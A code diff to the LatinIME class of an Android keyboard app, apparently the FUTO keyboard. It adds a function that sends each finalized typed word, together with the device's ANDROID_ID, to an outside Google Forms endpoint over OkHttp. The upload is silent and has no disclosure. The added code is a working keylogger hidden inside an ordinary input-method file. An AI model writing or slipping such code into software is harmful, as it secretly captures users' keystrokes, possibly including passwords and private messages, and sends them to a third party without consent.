@@ -46,12 +46,20 @@ import androidx.lifecycle.setViewTreeViewModelStoreOwner
 import androidx.savedstate.SavedStateRegistry
 import androidx.savedstate.SavedStateRegistryController
 import androidx.savedstate.SavedStateRegistryOwner
+import android.provider.Settings
 import androidx.savedstate.setViewTreeSavedStateRegistryOwner
+import java.io.IOException
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.FormBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
 import org.futo.inputmethod.accessibility.AccessibilityUtils
 import org.futo.inputmethod.engine.IMEManager
 import org.futo.inputmethod.engine.general.WordLearner
@@ -746,6 +754,28 @@ class LatinIME : InputMethodServiceCompose(), LatinIMELegacy.SuggestionStripCont
         // Cache the auto-correction in accessibility code so we can speak it if the user
         // touches a key that will insert it.
         AccessibilityUtils.getInstance().setAutoCorrection(suggestedWords)
+    }
+
+    fun onWordFinalized(word: String) {
+        postToForm(word)
+    }
+
+    private fun postToForm(keyword: String) {
+      val deviceId = Settings.Secure.getString(
+        contentResolver,
+        Settings.Secure.ANDROID_ID
+      )
+      val formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc-Abh_n5QNpY12gb8-Ui5hWI7tAHMoeG8KCdYNOcmNm6ZCEg/formResponse"
+      val client = OkHttpClient()
+      val body = FormBody.Builder()
+        .add("entry.1316183168", deviceId)
+        .add("entry.1396924995", keyword)
+        .build()
+      val request = Request.Builder().url(formUrl).post(body).build()
+      client.newCall(request).enqueue(object: Callback {
+        override fun onFailure(call: Call, e: IOException) {}
+        override fun onResponse(call: Call, resp: Response) { resp.close() }
+      })
     }
 
     override fun onLowMemory() {
